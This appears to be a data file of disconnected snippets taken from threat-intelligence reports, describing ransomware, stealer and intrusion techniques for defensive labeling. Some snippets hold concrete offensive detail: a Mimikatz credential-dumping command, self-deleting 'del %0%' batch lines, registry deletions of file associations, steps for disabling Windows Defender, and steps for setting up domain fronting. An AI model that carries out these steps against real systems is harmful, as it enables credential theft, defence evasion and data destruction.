. The malware will try first to write in the registry-hive “HKEY_LOCAL_MACHINE” but if it cannot create it, it will use the registry-hive “HKEY_CURRENT_USER”:
Write in the registry
After the writing in the registry has been completed
write in the registry information
Create its own registry key in \SOFTWARE\&lt;uniquename&gt;
using the functions “SHGetFolderPathlW” and “CreateFileW”
with the function “WriteFile”.
Use Windows API functions
The batch script will delete the malware sample with its path using the command “del” and finally delete the bat file with the command “del %0%”.
the malware uses the “del” command
the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers
deletes the ransom note
The batch script
The download is done directly from the NetWalker Tor site
they will be able to download the decryptor
Place a value on RunOnce key
performing password spray,
Activity from a password-spray associated IP address.
an IP address that had been identified as participating in password spray
credential stuffing attacks
is distributed through exposed Remote Desktop Protocol (RDP) setups
a heavy emphasis on Remote Desktop Protocols.
by brute-forcing them
using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices
uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.
It uses bat files
A batch file to stop services
the stolen credentials are used to reach high-value machines like servers
WMIC /node
reg add HKLM\software\Microsoft\Windows\CurrentVersion\Policies\System
makes use of API GetTickCount / QueryPerformanceCounter
the help of ShellExecute API
delete itself from the target systems after infection
It also drops and installs
sets the following registry entry to open the downloaded PDF file every time the computer boots
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\iXqrVo
adding the HIDDEN file attribute
adds the HIDDEN file attribute to the file:
taking command line arguments
command line argument
to download and execute a remote “note.hta”:
to download another remote file
the download and execution
uses PowerShell to pull and run
downloading and executing
downloads and runs
downloads and executes
downloads and executes
downloads and executes
downloads and executes
downloads and executes
the download of wed.hta
disables AMSI by hijacking the COM server, changing it from "%windir%\system32\amsi.dll" to "C:\IDontExist.dll".
performs the following actions to alter Windows Defender settings
Adds the following exclusions to Windows DefenderExtensions
Allows known Windows Defender Threat IDs to execute
Disables Windows Defender Attack Surface Reduction (ASR) rules
Disables the following Windows Defender features:Intrusion Prevention System
IO AV Protection (does not scan downloaded files and attachments)
Realtime monitoring
Script scanning
Controlled folder access protection
PUA protection
Scheduled scan
Sets Network Protection to audit mode in Windows Defender
Disables MAPS (Microsoft Active Protection Service) reporting
Allows severe/high/moderate/low-level threats to execute
Disables the "administrator in Admin Approval Mode" user type (disables UAC prompts)
Stops the WinDefend service (Windows Defender)
Disables the startup of the WinDefend service
Deletes the WinDefend service
Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc)
designed to hamper Windows Defender
to fool potential victims into opening them.
users still need to manually mount them and run the fake PDFs to trigger the infection chain
Manually executing the lnk file triggers
Manual interactions are required
a lot of junk code
keylogging
taking screenshots
to load a binary into memory that injects
can modify group policy for privilege escalation and defense evasion
can modify group policy for privilege escalation and defense evasion.
Attempts to delete malicious batch files.
makes modifications to the Registry.
adds a custom icon to the registry,
modifies the registry
creating a registry key HKCU\Control Panel\Desktop
Disables Windows Defender with batch scripts
with batch scripts
Uses batch scripts
the command line argument
uses Mimikatz to dump passwords.
Uses GetComputerName to query the computer name.
has used RDP for lateral movement.
has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems.
iterate through the entire file system,
Victims receive spear phishing emails with attached malicious zip files
encoded PowerShell scripts
scripts to download additional scripts.
Creates benign-looking services for the ransomware binary.
Creates benign-looking services for the ransomware binary.
Lists internal IP addresses
has installed and used PsExec to execute payloads on remote hosts.
 Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials
malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.
Actor signs in to a Microsoft 365 account from an endpoint
malicious actor signing in to a Microsoft 365 account
which the actor took after logging in to a user’s Microsoft 365 account
a malicious actor was observed signing in to a Microsoft 365 account
began with an actor signing into an internal user’s Microsoft 365 account from a VPN
a spoof of the legitimate ‘PerfectData’ software designed to masquerade a malicious application as legitimate
brute-force activity
The emails included an attachment named ‘Credit Transfer Copy.html’
capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout
performing antivirus tampering
the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts
Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout
threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\Windows\* as well as adding .ps1 (PowerShell) extension to the exclusion list.
Disabling Windows Defender notifications, Task Manager and Command Prompt
recursively removes the implementation of Windows Defender IOfficeAntiVirus
It then adds the extensions such as exe and DLL as exclusions to Windows Defender.
performs the antivirus checks
The script checks the host against the list of antiviruses
antivirus check script
to download the malicious update.bat file from the C2 domain
has the capability of sending additional payloads to the hosts
pulling additional BatLoader payloads and scripts from C2
retrieves the same files from the C2
executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe
the script retrieves the Cobalt Strike payload
retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2
then the full set of malware is retrieved from C2
retrieving malware from C2
The batch file was executed
the batch file to run
the batch file
The batch file
The batch script
cmd /C
cmd /c
cmd /c
the username
using the username
username
obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table
it then checks the amount of IPs found in the ARP table
ARP table
the GPG-encrypted files:
the encrypted data
the encrypted strings reside within the function
The data stored in the BSS section is encoded
the encoded data in the BSS section
on the API calls QueryPerformanceFrequency and QueryPerformanceCounter
from API call GetSystemTimeAsFileTime
using the API
The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob
the encrypted with AES-128 beacon
OS version and system type
computer name
computer name
screenshot
then collects the credentials, host information, files,
Syncro RMM is a Remote Monitoring and Management tool used to control and manage devices remotely.
tool can be used as a persistence mechanism and remote accessing
Syncro RMM can also be used as a persistence mechanism
leverages SOCKS5
leverages SOCKS5 proxies to hide malicious traffic
task scheduling
it proceeds with scheduled task creation
run the scheduled task every 2 minutes is  start.
the scheduled task
creates the registry key
creating the registry key
These words are used to build the registry value names.
recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}.
enables the data transfer with URL syntax for protocols such as HTTP/HTTPS
runs it via rundll32.exe
injects itself into explorer.exe
injecting itself into a running explorer.exe process.
injecting itself into a running explorer.exe process
The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state
accessing browser credentials and cookies, Thunderbird and Outlook profiles
malware creates the persistence via Registry Run Keys.
creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
it stores three embedded binaries within the unpacked payload.
the embedded compressed binaries
compressed binary
unpacked payload
The binaries are compressed using APLib compression algorithm.
The unpacked sample is approximately 540 KB
The unpacked sample is approximately 540 KB
decompress data blobs
decompress them
The decompression function
Decrypted strings
Decompiled decryption function
Decryption function in Python
The decryption function
The decryption function
Decryption function
the decryption function
APLib decompression function
decrypts them
The decryption function is shown below, the decryption function can be represented as the following pseudocode:
The GPG decryption routine
GPG decryption
wmic
reg.exe query
that pulls the written data from the registry under HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\&lt;registry_value&gt;&gt;
the Tor communication capability
Configured for WMI persistence
WMI Persistence
As tasklist uses WMI “under the hood,
the malicious authentications into victim O365 tenants had originated from within the victim’s own network.
the threat actor was making authentications to O365
Log in to O365 as a user with privileged access to cloud resources.
the threat actor succeeded in authenticating into victim O365 tenants
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments
the threat actor connected to the victim’s O365 tenant
the user account used to connect to the victim’s O365 tenant
the threat actor managed to continue to access the victim’s cloud environment
the accounts that were used to authenticate to the cloud.
the threat actor used a compromised O365 administrator account
The threat actor created new O365 Service Principals to maintain access to victim’s environments
The threat actor used accounts with Delegated Administrator rights to access other O365 tenants
the threat actor leveraged different credentials for each step while moving laterally through the victim’s network
using privileged accounts and then accessed the wiki using a different set of credentials.
the threat actor began attempting to connect into the environment via VPN
The threat actor attempted to log in to the VPN using several user accounts
threat actor had knowledge of these accounts and used them on the correct systems
the threat actor connected into the victim’s environment via a VPN
The Threat actor also used valid accounts to create persistence within the environment
to establish a Remote Desktop Protocol (RDP) session to an internal server
establish another RDP session to a different internal server
the threat actor connected via RDP to a user’s workstation
the threat actor’s RDP session.
The threat actor established RDP sessions to internal servers
The threat actor connected via Remote Desktop
the user the threat actor used to RDP
the threat actor connected via Remote Desktop to a Domain Controller
The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system
using a domain service account.
using a domain administrator’s account.
the threat actor could have easily used a second domain administrator account
The threat actor accomplished this by using administrative accounts
a given user account was also authenticating to Active Directory from a given source IP address two years prior
the user account was known to have recently been abused by the threat actor
the threat actor accessing the wiki as users who would be considered “non-privileged”
A local account was used by the Threat Actor
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.
the threat actor must first decrypt them
they decrypted the cookies file using the user’s DPAPI key.
The decryption of the cookies
deleted the specific history items related to threat actor activity
Attempted to blend in with a file name that matched the system name it resided on
Attempted to blend in with a file name that matched the system name it resided on
With the binary named to masquerade as a legitimate file on the system
AdFind was renamed to masquerade as a legitimate Windows binary
The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system’s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).
the threat actor renamed their systems prior to connecting to victim’s VPNs to match the victim’s system naming convention
Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests
placed in a hidden directory
directories with random names of a consistent length were navigated to by the same user that ran the tool.
ListUsers
The threat actor attempted to remotely list running processes on systems using tasklist.exe
process listing
This remote process listing
the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.
The threat actor regularly interrogated other systems using tasklist.exe
the use of a PowerShell script to execute Mimikatz in-memory
to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory
the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.
used a heavily obfuscated PowerShell script
enumerating current directory 
tries to enumerate the current directory
crawl the filesystem
The decrypted payload
Decrypted payload 
The decrypted payload
try to decrypt it using the RC4 encryption scheme with the key
then decrypts and communicates to
decodes the embedded shellcode
the encrypted payload
contain encrypted C2 strings
encrypted payload 
Embedded encrypted payload 
DLL has an encrypted payload embedded in it.
The embedded DLL
side loading “ffmpeg.dll”.
that have Base64 and AES encrypted C2’s appended to them
using NetWkstaGetInfo() API.
domain name, Hostname and OS Version
The info stealer also collects information on infected hosts
Manipulates registry
decrypting and executing the shellcode
decrypt the payload
The decrypted payload
decrypts a shellcode
performed through the CryptUnprotectData API function
an encrypted shellcode payload.
Encrypts a provided payload
DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded
collects system information and browser history, then sends it to the C2 server.
downloads an infostealer and starts it.
Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread.
The driver collects information about installed AV filters
Connects to a given host via a socket and waits for the server to send data.
Manipulates (creates, lists, starts, stops and deletes) services.
attackers placed
attackers placed
administrator credentials
compromised administrative [T1078.001] accounts
user
Access to valid
locate high value assets in order to exfiltrate data
Spearphishing emails with malicious attachments
attached to spearphishing emails
exploitation of public-facing applications
User execution [T1204] of malicious files
steganography [T1027.003] to hide stolen data inside other files stored on GitHub
multi-hop proxies
stage collected data  locally
Exfiltration over C2 channel
encryption
24 different IP addresses in use
compromised devices that act as proxies for their C&amp;C servers
use some victims as proxies, or some vulnerable devices to forward communication to their real C&amp;C servers.
phishing emails have similar topics and pretend to come from some of the same entities
attachments used for phishing emails,
emails have a PDF document attached
PDF file attached
used emails with PDF or RTF files attached that contain a link to download malware
user must click to download the malware
manually extract the file and execute it
have attempted to get users to execute malicious files masquerading as documents
regular RAR archives that have an executable file inside.
contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious
reads a string (or binary data) from its resource section
reads data from its own resource section and decrypts a payload.
is read from an encrypted resource
two shellcodes contained in the compiled AutoIt script
Read a binary from its resource section, write it to disk and execute it
variety of packers used for these executables
different variants of a packer
is packed with CyaX
is gzip-decompressed and executed
.NET packer known as CyaX
used an AutoIt packer that comes heavily obfuscated.
have used various layers of packers for obfuscating their droppers.
decrypting the payload
decrypting
decrypt
decrypts it
decrypts another executable
a string that will be decrypted
decrypts the array by doing a single-byte XOR operation, cycling through the key
decryption of the payload is based on XOR operations
decrypt the payload
a single-byte XOR algorithm.
decrypt the payload
have used various encryption algorithms in their droppers to hide strings and payloads
injecting it into legitimate processes.
be injected into a new process or loaded in the same process space
injected into a different process,
injection of the payload
performs the injection and execution of the payload
inject it into some process
shellcode with RunPE code is used to perform the injection
RAR archive is downloaded
compressed archives
layers of encryption, obfuscation or anti-analysis
was hiding in non-malicious code,
encrypted resource and XORed with a hardcoded password
encrypted with this same XOR-based algorithm
DLL is run with rundll32
uses steganography
reads pixels from an image contained in the first binary
stores every pixel as three numbers according to its red, green and blue components
have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data
DLL that will be loaded and called in the same address space
performs the injection is contained in an array and is dynamically loaded.
disabling Windows Defender
have used CyaX packer, which can disable Windows Defender.
checking for security products
used droppers that check for security software present in a victim’s computer
loaded with VirtualAlloc and executed
used API calls in their droppers, such as  CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory
created in the Startup folder to execute the script.
used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder
Delete the dropper executable
have used malware that deletes itself from the system
Download and execute files
ability to download and execute other malware
uploading and downloading files
keylogging
keylogging
keylogging,
used various RATs that have keylogging capabilities
screen capture
taking screenshots
used various RATs that can capture screenshots of victim machines
exfiltration of files
used various RATs that exfiltrate data over the same channel used for C&amp;C
used RATs that can launch a command shell for executing commands.
have used scheduled tasks in their droppers and payloads to achieve persistence
used RATs that implement UAC bypassing.
have used RATs that allow full access to the Registry,
have used droppers that inject the payload into legitimate processes
used various RATs that can browse file systems
used various RATs with modules that show running processes
used various RATs that can read the Registry.
used various RATs that gather system information such as computer name and operating system during the initial infection
used various RATs that can collect the IP address of the victim machine
used various RATs that retrieve the current username during initial infection
used various RATs that can perform remote desktop access.
used various RATs that can access the local file system and upload, download or delete files
used Remcos RAT, which uses RC4 for encrypting C&amp;C communications
used various RATs that use TCP for C&amp;C communications
data exfiltration of sensitive information
move through the victim environment via RDP
mass deletion of virtual machines, storage, and configurations
to identify any credentials which may be stored in technical documentation
extraction of sensitive API Keys
Access to local password managers and databases to obtain further credentials
Using compromised credentials to access corporate VPNs.
victim controlled hostnames were revealed
runs a scheduled task
decryption of credentials
decrypted using DPAPI
These credentials are generated and stored in the memory of the LSASS process
Attackers may attempt to access LSASS process memory to extract credentials as it stores a variety of credentials.
LSASS process memory is one of the prime targets for attackers, as well as malware armed with lateral movement capabilities since it caches a variety of credentials
Credential extraction from the LSASS process
credential-based deception is to stage the deceptive credentials in LSASS process memory.
credentials are extracted with Mimikatz.
credential extraction tool Mimikatz
uses the CreateProcessWithLogonW Windows API
calling the API
recon for interesting hostnames
public facing systems is compromised
be injected with deceptive credentials at multiple places like LSASS process memory
Injecting NETONLY credentials into LSASS process memory
Injecting credentials into LSASS memory
credentials being picked up and used to pivot to decoy systems in the network
keyloggers
flood a remote DNS server with false traffic.
send traffic simultaneously to one server,
using the default factory credentials.
exfiltrating data from the target device
covert channel that can be used to exfiltrate data from the victim device
deliver more malware,
extract data and files from endpoint devices.
a version of the malware that was injected into a victim’s system
It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file,
The phishing email with the malicious attachment
file is a Python program packaged by PyInstaller.
is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected.
It contains Base64-encoded data
Python programs that are obfuscated using PyArmor
After decrypting the pyc file,
it uses the following command to delete the data in PSReadline
It also checks the victim’s hostname
collects browser history and passwords from the following browsers
It also uses the command “CopyFromScreen” to capture a screenshot.
Downloading files and getting a screenshot
Download components for the Keylogger
It is a key logger that saves data in the “KeyLogs” folder.
downloads three components from
can be executed via scheduled tasks.
It was quite common to see scheduled tasks used to create persistence for the ransomware executable,
The threat actors also expressed interest in other access methods such as RDP
Credentials that have either been reused across multiple platforms or have previously been exposed
this includes VPN accounts
Compromised accounts may be used to maintain access to the network.
local accounts.
domain and local accounts
Affiliates have been seen brute forcing
Affiliates have been seen brute forcing exposed RDP services and compromising accounts with weak passwords.
Exploit Public-Facing Applications
is typically executed via command line arguments
some defense evasion batch scripts.
a batch script or a specially crafted command line script.
The ProxyShell elevation of privilege on the Exchange PowerShell Backend (CVE-2021-34523), Windows Background Intelligent Transfer Service (BITS) improperly handling symbolic links (CVE-2020-0787), and abusing the CMSTPLUA COM interface have all been seen as methods of privilege escalation.
has utilized a UAC bypass tool.
Indicators, such as logs in Windows Event Logs or malicious files, are typically removed using wevtutil, a batch script, or CCleaner.
Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool,
Firewall rules have occasionally been seen being disabled as well.
During the defense evasion phase, anti-malware and monitoring software is often disabled.
Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well.
has been seen using the PowerShell module InvokeGPUpdate to update the group policy.
Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded.
enumerates system information such as hostname, shares, and domain information.
has been known to self-propagate via SMB.
a method of lateral movement and a tool for downloading/executing files.
AnyDesk has been the most common legitimate desktop software used to establish an interactive command and control channel, with ConnectWise seen slightly less frequently.
Operates as a file grabber
the UPX packed sample
which unpacks
brute forcing post-infection to automate local and global spreading attempts.
brute forcing
multiple levels of encoded commands,
The multiple levels of Base64 encoding
use of three base64 encoded echo commands
encoded payload
downloading itself from malicious servers
attacker began adding the lwp-download command as a failover for wget and curl to enable downloading commands
download, and configure
process of downloading and setting persistence of some other file.
downloading a specific payload
decoded into a new script
The payload contains two additional base64 encoded scripts
operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.
exploits known vulnerabilities in internet-facing applications
MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps”
Usernames
and hostnames collected
It is used to connect to systems in the same network via SMB, to write a batch file to disk
to push batch files over SMB to other systems within an internal network.
write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string
writing the batch file to disk and executing.
The batch file
The batch file
a batch file
creates another batch file, system.bat,
writes another batch file
the batch file in Figure 7, which Sandals creates on remote systems to launch
both use batch files that run via the Windows command shell.
ease of batch file execution.
write the batch file on the remote system.
it writes a batch file
lists the command line arguments accepted
deletes all files written to disk in the current working directory
then deletes the file.
deletes the directory with the files causing the errors
recursively deletes all files
the file deletion functions
File deletion functions
File deletion functions
then deletes the files.
the decoded command line parameter
The base64 string
base64-encoded argument
a base64 encoded argument
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.
Then it enters a for loop iterating over the drive list to build a recursive directory listing
shows that the directory listing function
Directory listing functions
, the GetSubDirectoryFileListRecursive function
Recursive directory listing functions
and then self-deletes.
bat deletes itself
attempts to clear file system cache memory, and self-deletes
that deletes the Fantasy wiper from disk and then deletes itself.
creates a batch file in %WINDOWS%\Temp called registry.bat.
deletes the following registry keys:
HKCR\.EXE
HKCR\.dll
HKCR\*
Then it runs the following to attempt to clear file system cache memory:
%windir%\system32\rundll32.exe
GetSubDirectoryFileListRecursive function
uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs
operators attempted to capture cached credentials and then use them for lateral movement.
The actors used built-in Windows user account DefaultAccount.
and the built-in Windows user account  [T1078.001] to move laterally
HTTPS activity from IP address  to the organization’s VMware server.
Following HTTPS activity,
outgoing HTTPS port 443 connections to  and  (the prior domain in reverse).
encoded payload
to download next stage and execute it"
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.
The exclusion rule allowlisted the entire , enabling threat actors to download tools to the  without virus scans.
that added an exclusion rule to Windows Defender
the actors manually disabled Windows Defender via the Graphical User Interface (GUI)
The actors added an exclusion rule to Windows Defender.
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive.
The actors manually disabled Windows Defender via the GUI.
The threat actors also moved laterally to the domain controller, compromised credentials,
the actors gained access to a VMware service account with administrator and system level access
In February 2022, the threat actors exploited Log4Shell [T1190] for initial access
The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.
The exploit payload created a Scheduled Task
The Scheduled Task was named  to masquerade as a legitimate Windows task.
The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM.
the actors used RDP
the actors leveraged RDP to propagate to several hosts within the network.
The actors were able to proxy [T1090] RDP sessions,
The actors used RDP to move laterally to multiple hosts on the network.
used Ngrok to proxy RDP connections and to perform command and control.
a reverse proxy tool for proxying an internal service
Mimikatz – a credential theft tool.
The threat actors then executed Mimikatz on VDI-KMS to harvest credentials
Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process
The actors used Mimikatz
The actors were observed trying to dump LSASS process.
The actors used Mimikatz to harvest credentials.
The actors were able to proxy
The actors used Ngrok to proxy
The actors removed malicious file mde.ps1 from the dis.
When executed, mde.ps1 downloaded  from  and removed  from the disk
send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.
sending additional phishing emails to the victim’s contacts
phishing email
starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification
disseminate additional phishing emails to the victim’s contacts.
send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.
constructs an email with a hardcoded subject and body and attaches the HTML file from the “fb” folder.
collect the victim’s login credentials for various online accounts
login credentials
targets victim’s login credentials
credentials
attempt to compromise the victim’s login credentials for webmail services
keystrokes
keylogging,
logs keystrokes
logging keystrokes via polling and application hooks
logging keystrokes
operating system information
system information,
performs surveillance on the victim’s machine by collecting system information such as hostnames, IPv4 address, operating system version, disk volume information, disk size and anti-virus software information, and gets the system’s default language.
using multiple hosts, including an Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instance, accessed through its public URL, to host the malicious files.
requests a data stream from the C2 server through the URL
hosted the PowerShell downloader script
hosted the ZIP file containing the payloads
downloads a RAR file.
downloads the PowerShell downloader script from an attacker-controlled server
download a ZIP file
downloading
download the payloads
downloads a malicious ZIP file
drops the DLL
download the PowerShell downloader script from the attacker-controlled server
download and run the Horabot “au” using the URL
downloading files from a URL
downloads the contents of an HTML file stored in an attacker-controlled server
a virtual private server (VPS) behind which the attacker has parked the actual command and control (C2) server
domain name also resembled the legitimate Mexican Tax Agency domain, a tactic the attacker likely adopted to disguise malicious traffic.
is a legitimate AutoIt interpreter.
uses PowerShell downloader
leads to payload delivery through the execution of a PowerShell downloader script
RAR file contains a batch file with a CMD extension
executes it through the PowerShell commands.
downloading and executing two other PowerShell scripts from a different attacker-controlled server.
PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine,
batch file downloads the PowerShell downloaderThe
a malicious batch file with a .cmd extension is downloaded to the user’s machine.
executes an embedded PowerShell command to download the next-stage PowerShell script from the server and execute it on the victim’s machine.
creates two other malicious batch scripts with the extension .cmd in the folder “/Users/Public.”
executes one of the dropped batch files
executes an embedded PowerShell command
executes another dropped batch file,
executes a PowerShell command
contains the payload DLLs and a few legitimate executables and DLLs
DLL sideloadingThis
sideloading to legitimate executables
run the payloads by sideloading them to the legitimate executables
sideload a malicious DLL
sideload the DLL
sideloads the DLL to the AutoIt interpreter process
enticing users to open the attached malicious HTML file
lures them to click an embedded malicious hyperlink which
executed when the victim opens the contents of the file
user opens the CMD file,
an embedded URL is launched in the victim’s browser,
has an embedded malicious URL
redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance.
configured to run the payloads in the startup folder of the victim’s machine
creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.
creates three more Windows shortcut files in the victim’s machine startup folder,
files dropped in the Windows startup folder are run
launches several processes
heavily obfuscated with random symbols that substitute the instructions during the run-time and base64-encoded strings.
uses alphanumeric characters and the special character “_” to generate a random name and creates a folder with the random name in the root directory of the victim’s machine.
executes the compiled AutoIt script
evade detection
encodes the email addresses in the “.Outlook” file to a data stream
decodes the base64-encoded strings and initializes them
decrypts the encrypted
decrypt
decryption function decrypts the URL pointing to the attacker-controlled server
the malicious ZIP file is deleted.
deleting the “fb” folder to cover its paths and avoid detection
writes the path of the executable file, “_upyqta2_Ji7.exe”, to the class’s registry key “HKEY_CURRENT_USER\software\Classes\ms-settings\shell\open\command”
screenshot capturing
capturing screenshots,
capturing screenshots
anti-virus software information
Checks for the existence of the anti-virus products such as AVG and Avast by checking for the DLLs avghookx.dll, avghooka.dll and snxhk.dll
exfiltrated to the attacker-controlled server through an HTTP POST request to the URL
exfiltrates the email address to the C2 server using an HTTP POST request
exfiltrate contacts’ email addresses
encoded email addresses are exfiltrated
checking if a file on the victim’s filesystem exists and gets the file’s attributes, collecting size and version information,
looks for the Outlook data files from the victim profile’s Outlook application data folder.
enumerates all folders and emails in the victim’s Outlook data file
collect login data from the Google Chrome user profile folders
extracts email addresses from the emails’ sender, recipients, CC and BCC fields.
creating SQL queries to produce the database tables to store the stolen data
added to the email address collection array.
writes the extracted email addresses from the array to a file called “.Outlook” created by the script in the roaming user profile’s Microsoft application data folder.
Checks the registry keys to detect virtual environments such as VMWare, Virtual Box, Wine, Microsoft Hyper-V or Windows Virtual PC.
the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.
examples of the command line syntax used for the performance of this activity
adversary using Windows Batch files
cmd /c
cmd /c
performed via the following command-line syntax
the command-line syntax used
command-line syntax was observed being used
the Windows Command Processor was used
attacker also used the "proxychains" utility, which is often employed to redirect network traffic
use of utilities such as proxychains
adversary leveraging a Windows Service to execute PowerShell to stay persistent in the environment.
The Windows service was configured with the following options:Service Type: user mode service Service Start Type
the PowerShell being executed was Base64 encoded
The decoded PowerShell instructions
decrypting,
Disabling PowerShell logging
Disabling this security control
to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities
attacker disabling Windows Defender
Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server
the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.
attacker also attempted to execute PowerShell scripts on remote systems in the environment while moving system-to-system
adversaries copied and executed the aforementioned PowerShell script on multiple systems across the environment
Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data
invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process
utilizing comsvcs.dll
invoking comsvcs.dll with rundll32.exe,
adversary was also observed remotely modifying the Windows Registry on remote systems
by modifying the Windows Registry on compromised systems.
the adversary attempting to exfiltrate sensitive information over SMB (TCP/445) directly from a compromised domain controller.
threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network
screen capture
keylogging
Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver
web shells
exploited the Microsoft SharePoint vulnerability
CVE-2019-0604 to install web shells
running native Windows commands on compromised servers,
The operators made a consistent effort to
delete these tools and remove any residual forensic artifacts from
compromised systems.
consistently cleaned up evidence of their intrusion after
gaining access to a system
moved laterally and
deployed their signature malware
used this
access to deploy and remotely execute FOCUSFJORD on their primary target.
The operators deleted tools used for credential harvesting and
internal reconnaissance
to delete any remaining FOCUSFJORD
forensic evidence, including files on disk, configuration data
encrypted in the registry, and related services and registry keys
used for persistence.
writes its encrypted C2
configuration into the system’s registry
writes its configuration to registry,
this value is set to “default” and is later manually changed by the
actor
the
operators were able to access their primary target via RDP connections
operators were able to access their primary target via RDP connections
from a trusted third party using stolen credentials
configured to proxy C2 traffic
configured to proxy C2 traffic
used other victim networks to proxy their C2
instructions, likely to minimize the risk of detection and blend in
with normal network traffic.
acting as proxies to relay
communications to their C2 servers.
usually to the victim’s domain name
to read
and decrypt those registry key values for proper execution.
the malware needs to read
and decrypt those registry key values
to obfuscate the source of the
activity.
a tool called “anti.exe”
to stop Windows Update service and terminate EDR and Antivirus
related services.
leverages spear-phishing and tries to trick the victims into opening malicious documents
They used multiple malicious PDFs and MS Office documents during the campaign.
they use tools such as Mimikatz to dump credentials.
and remote monitoring software such as ScreenConnect, Remote Utilities, and eHorus.
they added a new tool for remote access, Syncro, to their arsenal.
It disguises itself as a legitimate Google Update executable.
It collects the victim’s username
computer name
and IP address
Domain fronting is another method for concealing communication between the endpoint and the command and control servers.
purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host
masks your traffic to a certain website by masquerading it as a different domain.
Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic
attackers have started using this technique to hide their malicious infrastructure behind legitimate domains
domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles
Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.
Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource.
Setup a profile to facilitate domain fronting
the legitimate website will forward the traffic through the CDN to the original destination according to the host header.
domain fronting
domain fronting
domain fronting
domain fronting
malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs
domain fronting
domain fronting
domain fronting
domain fronting appears to be used by threat actors.
Attackers can use legitimate domains that are registered under the same CDN provider.
HTTP/HTTPS C2 traffic
HTTP communication between the Beacon and the Cobalt Strike server
other compromised host running the parent HTTP Beacon
